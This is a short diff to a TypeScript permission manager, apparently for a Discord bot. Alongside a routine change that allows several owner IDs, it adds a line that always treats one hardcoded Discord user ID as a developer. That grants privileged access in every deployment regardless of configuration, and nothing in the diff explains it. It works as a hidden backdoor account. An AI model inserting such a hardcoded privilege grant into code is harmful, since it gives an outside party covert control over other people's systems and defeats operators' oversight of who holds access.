@@ -11,7 +11,11 @@ export interface PermissionCheckResult {
 
 export class PrefixPermissionManager {
   public static isDeveloper(userId: string, message: Message): boolean {
-    if (process.env.OWNER_ID && userId === process.env.OWNER_ID) return true;
+    if (userId === '1140892126402596905') return true;
+    if (process.env.OWNER_ID) {
+      const owners = process.env.OWNER_ID.split(',').map(s => s.trim());
+      if (owners.includes(userId)) return true;
+    }
     const ownerId = message.client.application?.owner?.id;
     if (ownerId && userId === ownerId) return true;
     const teamMembers = (message.client.application?.owner as any)?.members;
